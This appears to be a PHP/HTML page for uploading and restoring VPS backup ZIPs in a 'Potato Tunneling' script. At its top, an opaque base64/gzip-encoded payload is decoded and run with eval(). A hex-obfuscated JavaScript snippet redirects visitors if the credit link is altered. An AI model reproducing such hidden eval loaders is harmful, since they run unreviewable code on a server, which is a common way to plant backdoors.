<?php
$SISTEMIT_COM_ENC = "3Vm5CoVals0b+iceFXRh4HSdKF7grNd5HpICBQX1ipo4/Fd9kAgGioGBkQjte1n/QhsIHnS5PefsNeB//9c/HNlxeU12/80a2r95nf3Pn//5Aw1/GNv56a8Ob4g7bV9nhTzTedIKDXIaE4HNZ4OZvMEQAWD+8prJ5JFIl1YDoiOIJQBtcNyNw2gK9HUX9g8IdjVG7ECkHIAJHqqhgflaUwQMgkBPQqChpuJG6NwvpHUU5BEOGpKoBePPZ5vVUjL9c9/rM6EOK1QuoweQbhx3y6IeiaaBIy/qg2KOTUAWlPYYlhemRtoPVt37IYJm4QPFkZTiNN3HXU2Pisl/Nv4exf4UTKBdjK56+C+mFTKwE6Pc1csIlOonQ0N4dUTZVyMCZdZOT+ooK7iTRcw641fFPBVPH4RS+96frXJ0Twh/JfET7D0UewNZlTtHQM3xrR7MmoCq28ER6ljDoRU9Va0XBs2zeM/Pkj4SZLtSHS4/gDIxVk9F4fjBlJrIGKa4mAsO0uD3gMgaWVHYYOJpk2Eg7tMU1c4Xyx+Qy6mKSm5YkMHJfiBpbl1sR/yeoNsWxSSjGjpzGuV7/cwlWJwB3vBzdRe+SZEohSvfj/Lbos4pkPgo97C1A4fax7mmmSh/wlB5FBtZ5lwKY35vP0k0OeWv6prp20mZy7NlFZZyNbozO7AJMs/iCYUfNYArZzJ8+R6d0VbBpmTwA86DjjZ5o1b8JpvHFMF/3H1QhubmwEAs8F4OkFVbCN10+dAUN7IA/fkMPzy0g5SLtfaT1/KiXXVQ0AdgOwHNWFUBKfMX0mHxNIMV8YsROGsxEJUZwLS5vs7QW6cf3a2FnQ82kHL0WbZEJfFBH+A0MCp+suegWtwrbMF0iPLXvP8guJF3bYrMvO+oEksu8awP9kq5+gkGoBkMtsHGYuA/vv/xIZFhUdL0j1YiNmO0E6VD5TsPN8kbqWdT2pFvlwSMBimFxk/cs0NbawRpmAofO5tSrJyJ9M2GazdKnkdHY2hjpuaVXtXaUafxKI74sbP9lxyeHU1ycHqgbls2sSa41TGup0IgUx80ppdpeX/YIFPd+yECv+gm+aMPCNOs/rJ7+Q7EGqAaa0rSQpSn0bMMH1shoaTkBC8YdpNhCOUzIJgYhGfg4HR/iUXmSINDsGYcRz9PlwrkW4uJO3fdGAgenQi47slAqB3ouxMSKbaWJ6Bv8McDUMZtpwA2e3/f2/d0B6UCZjWiW+7r1BcRuRCGHgF0DcD8doqNtMWUtREbAwxxlbU0XvfeUIs4vrUyPYza+Mh4pJYiX5oKnAxX0NILyapwDzJW20NE0Kv7WFWUUu04tsgYYPYwrEffCXA6Q0DdaTHhSHof7T3Il0MJMF9MLQ7o6ifeq5TqyZ4J+tVI5EpIdYGRT2OCrJAzyX2OyKyRQnhaeS++v+Lmcng94DSnzTmmR0wljy2P8aBPEvR2nN9ZGywlPeN2C3E3I9Y0k+daIBF+ciRn576nOHHjKrOFI98V6K+AIm50vwXU6Wo7n4cvZ53eDgQI+iyu1qaBp/hR/y4CkGGaKuP1wl0lAIg9L32INmCPerIn2348UIl/RrSaX4QZOHHiZDtJ1bVO+4EQHoZ19Snwy2BNVsc+mq+ofLunmOhPbwSdQSwjy/dj6HhTM+uT0TN8UhFpInRsYn6qia8yW+dHScW+35i39NzYPHW+2i4/JJZFCk0Onx6D+peRhUK8FBNB0GaTos9+cTE6sx+rpAupddTiWoKz9IdWG/GAAbg1yrMR6NE+/kEO9DxVU3Gg124+rCqbJkdchbLaJiqAAwyTtEdtyrhVgTG+gZeSZZhjrug0OsAHL8M0a4Vp8M1FdhQr0eu2eEsvxA5LMb4aBBiaz9T9DvmuTK+Aq5Qt9w/fd74gSv3NzpndEtlAx8aF8/LqK4vG0WniNBltfOpl+H5XrjsEWx2PdaMZHtX6dBhm9AesGbJnzp30NaNJEgABR3Nl3/XTczAt6h9SjaoFT+Qdw3Xler7rCplTyv+GxyYC5MEiJ/GpXcPxWPDInyBRsP81iKr/aUiBO0QBuPUv3URxmzqihv2uM++tfJrIdFa4hHPRJxjgM/osmIiUY3oxyk/R4j1ULVe7aq3ivemcFwA3ul73Wff9vW8e0ba1u5pSAOoMmkzivO51ZdClzVOxF2uuWJsNY4wlpVZ2NT65/0M4o6bM2mzLDlVCbRqpwqfE9mVICtj0GxvUH61LoVlQycy4+fiVimExBCxJ2LxxaJV/GhOHL3JkYgnL3xbnPYaK42bNaRYoqfkyrllTz7bKu0QjWXEplsgW++SC9xvQs3trf2lWsQ4+aHA/qxZ9oMs08BPaVr2r28X1O2/OXA/fHPx+EIjHbAiK978TrwXQGQ3mCezPULNmph6Ge/22pvXA5zj6eQZwvTNJrL5rSLsWQ6oheSGGiL5ObedoU1UWXsAMl1L8GLmDMoDYMWqYRcZW/NbrBvRK0m8hS+GQmwBDxeUqgrVn6ke1bSmwmsNBXIjxJ6h6sJ66c/acqmo/m2mR+YVCjhEnCshk1GIDtfEYuZGkmdNm2plPMSeGzXcWMECG+THdQpy0h/VDYzmLWOKLxIyFju+YLq0IjC/ZwEGnnWiYUOtHir76n2AO01HCKi2UmSRCHdXtq2E1c+EwDVnH+nTSMGmxr8nV6bF0gpm0YlOsacnqVV9Wi3dIvGQtr1Bb60t575bBJEThSX1U1eJFiddCGMkGqoZHThKZWfEvrfspTrDQwCLHrlerZkJlhWCeaZEwtsjRtGl/Eo4zLwePwuLk9NcBBk8WBdnNovuaiGWgERa73JpqyFhYM1GknyaDuQn+2bhBRS0vZGrG1D3OzEU9plznU8I41WxQae5nXUO+QNLWcAOENVSd71PEAy2M1b3ahBKcew5g90jN97eOHsn4afOd1NrWomqFofMKu6yLMxSJQOM5l9xPdPWjiSZcosv6eKy9O1dssVkCCdzpEln1WpuXgrzq1cVxHFObcK0GN2UD+xHSngRrqlZ9UCarIe5ikqUh2v4YXy+Zz4NR54i+/bSgaPuNdoYB6dkhT0wwBURStoo5hysJ9sECtKLqd2Xtf9IGXnyX3kU25vQYthqaLRAqptiaXpq8gIflMT8P/P44LwOnwmKxoJGRrRJNnaOcZZRG/ljPH5UZfJoJK3C2KMRgts6a43xPGzSzGCvJOdxrH0vKL1AP3aBxnjRWxYJLkt0UPtSkoik9R75L1JWzRqVJ2qH8KbKtDB9W6jZ5nHB8ZWT7UGLc8BDM0YednJGiQ3xvCj9Y6NtnVGepoN87QCgwP5zSR9vj69N+VJCSta3AjL2zWN+Ekeh04OoKBzHo7RONOOj5DmWwtKxs28s8INaXVW3fXRM2/IbVfUxzYD5CEMLiLMfqJ8UEIccKVR839NUwsTMfXn+5f+IdOAdBf+1NTszsHjo9mwS8IHaVF7qoF9uAqtKtuMkGDLInpmxYtNx1cEkdf2eCM5JTyeOpXTzqYVX0jaPtS6vib6HJ+hE63K7OJo23YB5suuPR5a7a9gTXdLvaecDay+f6IwUVnhRek53qv04+DZGdYJvU92Mq6amyC6MDlJQBxrkYPDWcAcBHDFN4M1SPeaU3zq84rd/7Rr7cr5DWtmJ9d3cjhsfVMt4ALcQq4xHYotVLL5BRtF6lqsk6jx3gZ+rcPohhXIieplA+D6PHO4R9CZUvdjJ7+pFMQRvWfTrk12wYzTDgdyH9jNaDillT1oltf27+J3JrrmW5QgWwbtZP1NiWJxl48MmPpdtJcWjT329iS/ZcAIeeffynLYihgIOz7THOmzDdA2A4Hjp0fyJzoYaLpuMIlIPuSQOhXzibqotxTfGdoLSc24XX596vNZB70L2Ho9Ua2wWkjQoQaPXcr7DGc828Ni6fY6f2J0jK2vwehk5oK01xIkAFPIQlXrPNQqkgXuBJcMwUuMaxgrkX/CAIUcpNZfZayJucYMJ959s4eD0qVFhVSwTG77gXE3t+MPAUhBWJVS51+ita6henTSR2hbIIOOVyui6zfYhw5jV43N/GSbpNhc85o5I0X3f36OFWfExOgYlpVexC5PkgavhO4O20vQdql1L38DyZiJJ+5EuBdvhvbGDsVg09knMgDcCctVlm0B8StnOz0Aekku7SZlf8pj4t6ykAzbIFiYLdzmzfrEaG3bEwj3bZHIfGeBpQ4owTz0hMMfAZRG/2L/y97oPUCRXC50OhvmLRTBf6U964D1GMPSX9Wibv3H6KPd4mAaPCceWRMKrtCxLmpU4RFT+EtIm7A2wMa73hytaTrjbqsbiZFr6yRULAvWeOtziEuUUccX/A5K7RhHWIezRZzz6l92Z0v51BBnYCHQ/slA0MtV3w3aHsy/bEJ4fEzHHXugkshzBUC2LWHGZWCdGyKKQKcdqsLaT7Bud9cOs/KFO1ul37gs+JNjJag0MCUY3vFJ51r+RybvTxb6JDVnkJ+EL2M1jGTN1dUH0fWWOhv/N3FxANwZA3Jj+abOJmOcagKSnQwgeVY6/UQn8emYyPG4yueVuMsZlSIfF6I5ywdjRTOZXIUhaMgfJwRLGbALRxvzm2na5Zki7zy4QatJmgEIeZT0Sh8SdlLoildWaWPHKHTGCbp+oUJti4p5bnGXiuIMaxVIN/1auS320rcDcQfgLqibeZNdVL5cNzEtCFaSNeSsmZvSLl+wYDqcMFCtMCAc9shY8Q0yr8R2kyUqPCGInV6t1LrF0fo+zS4tWtyjNPyYxdMTznkU04v2izHDDmAWl05YfqU6lZZWdbBKiGz4MxRTueKtb0vFdVTbDRD2Fr4naCUzoYofFwBfpw55awD7pdCcn9ywwARIwL+qbZZmdgG8Acg1KkEFZ8EA/UYBE/Lo3U1qb+svC+AsJbXD/pgODac0W0LuVqIskxRvAxyfGFEX2XyiqI4hT/W1RSLkjW15elJMCHFXvUbNIVKYRVZ1JULKGAqfp9v5sfgFq59SH79kPbOfyO3QAbyL5wEYvfx+eagJ1ySu0MYeY4ydDkw41pS0BSVWed8jg/t206mA2yZATKSqFApb38ewJGvZ0iaBOWhMq2dARHuyViQfuSlsYB50L7VMaHnvft+q0Sk0GMi7Vhtk3JB6pd/Kt95nJzSlZFvmR65mrKhMxA0DppWWbDjmcYFVbH9Xz6+J71WeXe5Z3H7iJR6FkQOmHx5R/4vHh9QLh4vIiDotL4Jfcu2X1VS6Rhf7UNCItcQqLPclwIK4s/eyvA0p3913T0pYkuiioZ6RzDoN/FiyyncyYJpBE0rUrmrKCrmR7AYSlDJfXd8xLWMT9PKAsm0fa5rnpNMSW75RS8pp5D4M3z/e+8rqBVpxLrR5GUhUSh/cSfS9vCiEthOQz9llWTcMEe+47ThPHzYL+Kpphe65uH0QdM9/4bb8JU+YczhT/3qQchw352Vu+5ojw0BMRDzayb5IIbsAWOxCXjqj4TWBHcypxFOcJrIN1cPaIaPjPVLwY9NfcxD1dvpfwWKRCb/HI6VvUrmTfyMF2x4KwG3sxMXwBB7Sv10jXlyRUCFZscuRXhn0GXoP44cB86HeHGk3h5YhEC+pLXd2iNzSD9T3DVqF390m8okS/5VjnOVMLCeEnmEOoPHEbF0CEw8XkpYtT9JHXGkviYfMsHOvcK/E5kSQBZeJy6d1kiqLiLscDyKwmJb8kxILNHg5iyo4176bWVyOwnJonIVnjPa4ikymGrnhrdQLlphE2CAIdp2RaVPpwleyiRkIMtWLRfPwNzmLMQY9yjvKGrvOG7FjqLEHEhUIdVD2cjktTtxpaTAsClyQLDPnQEaijheUsmZIT39aBEYkIErfGegle82dZAFEAQmJGyVADX1lAtlSRJVUuARZ70XF42aaGi1Z7lwI7dNKak9tnprVi+0EA1QlgTalr+IGQv5Ynsk4kR3z0McFckp4P79XkM4QZ+s2BmFExtzF24bhWdbm4ie/nUI5hhA6bVEj3qAM8txfn3KBA2/sAKx+KM+VmAS6D3s3dVI49SZthvx9Yonlzox4YjZl6NKfcsBtoepN8BZGYZ2tXYV4Ah+SkUWQDoOR9fC99gH9BYntd9EzVpUi8jKG/6OFaTSl0CuycQJHt8m4Bvkk4Pn8Cel37pajLkzUMuNDIgzlDzxlQGszd/hYt8QtdsK08dNMP8HamJT4Nm7vZG3WV5vEYrFVUiIPWFVA+UXCuGETcjoT+ovA/Ml8zMlQKszm6Ki+PU3ubq9Ugf452ErT9r+Aqp1Q3juflVntnh0PX5OFzzCaFLV9bFhATd9cFosjNNfyjC7D/CLjzExWF4adS3p5yYNac/Kgh+GvNU42sVsra7Wso9EnS4QWYFr4cQ3z5rOOJDgDKa/Z48yxSDApeX/h7ojS8oiWRUgyg9lg8TC9gWprNkj9h2Cxi02zRSlNGq/XrTADx9O/j5B7Cc5OsxcRA8lzilW3A1p+y5PQkvJ+mtMAMFLf0IYuGSQ0F/tmsliGqzQEQnV0eMzPPIEuDNeSFIAWj3YDVIomEI1KQAgsCTguYJjCDYSeB7lkBiIN7hDiS5P/71j+6qzz+Ta73xz7/PO53P+3/+cMoUvkS7sdzqayMWEvkpnARfyS6Yy0OOJvAPI+Gx1vvFlw3HbVR8nYTfOK+yXb/EfK/yBqeKRcOzPY0Tfu81bPObe00n7wWUYsFCdyHa5NUvPsfUPlr9NK/BTuSD3IE+OfumJ+XAxcWp3OG56IL+Cuj82AGmWUi8OXWFJsXpRqiuqBOzuLz+S/9+HoM8xC5dNO0dSH9dXKM4fING5anHMBOkCBZ7yItffLu/8Tnhb/yg+ht/NMS/8O3ub/yfjv2Fr/3Ov/BLrfwbv7T+er6umKQ6vFfUuRjZFMfTmRiqOK/240Coak/Q2ftny84vLhI//uv94lU17ntvocFf7MVz3u+UbrHRLPgLv/MZpzyFan/NYbApQXVcl/j9C3tPvGh0YHsyrT///OOf/7qfq/qf/7tcfy/hP//5r384rmH++cf/l/9bf/zrv//rfwE=";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="ls0b+iceFXRh4HSdKF7grNd5HpICBQX1ipo4/Fd9kAgGioGBkQjte1n/QhsIHnS5PefsNeB//9c/HNlxeU12/80a2r95nf3Pn//5Aw1/GNv56a8Ob4g7bV9nhTzTedIKDXIaE4HNZ4OZvMEQAWD+8prJ5JFIl1YDoiOIJQBtcNyNw2gK9HUX9g8IdjVG7ECkHIAJHqqh";
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Restore Data VPS</title>
	<link href="style.css" rel="stylesheet">
	<link href="button.css" rel="stylesheet">
	<link href="progress-bar.css" rel="stylesheet">
	<script src="p0t4t0.js"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="js/load_restore_vps.js"></script>
</head>

<body id="top">

	<header id="header">
		<div class="content">
			<h1>Restore Data VPS</h1>
			<p>Potato Tunneling</p>
			<ul class="actions">
				<!-- Form upload file -->
				<form id="uploadForm" enctype="multipart/form-data">
				  <p>
				  <span id="info_zip_file"></span>
				  <label>ZIP : </label>
					<input type="file" name="file1" id="file1">
	        </p>
					<input type="submit" name="submit" value="UPLOAD"/>
				</form>
				
				<!-- Progress bar -->
				<div class="progress">
					<div class="progress-bar"></div>
				</div>
				
				<!-- Menampilkan status upload (sukses/gagal) -->
				<div id="uploadStatus"></div>
				
			</ul>
			<br><br>
			<br><br>
			<p>
			  <a href="fitur" class='tombol'>Back</a>
			</p>
			<br><br>
			<small><a class="p0t4t0nc" id="p0t4t0nc" href="https://github.com/potatonc/ScriptAutoInstallPotato" title="Potato Tunneling">Script Tunneling by Potato</a></small><br><br>
		</div>
	</header>
<script type="text/javascript">
var _0xa094=["\x68\x72\x65\x66","\x61\x74\x74\x72","\x23\x70\x30\x74\x34\x74\x30\x6E\x63\x2C\x2E\x70\x30\x74\x34\x74\x30\x6E\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x70\x6F\x74\x61\x74\x6F\x6E\x63\x2F\x53\x63\x72\x69\x70\x74\x41\x75\x74\x6F\x49\x6E\x73\x74\x61\x6C\x6C\x50\x6F\x74\x61\x74\x6F","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x61\x64\x79"];$(document)[_0xa094[5]](function(){if($(_0xa094[2])[_0xa094[1]](_0xa094[0])!= _0xa094[3]){window[_0xa094[4]][_0xa094[0]]= _0xa094[3]}})
</script>
</body>

</html>
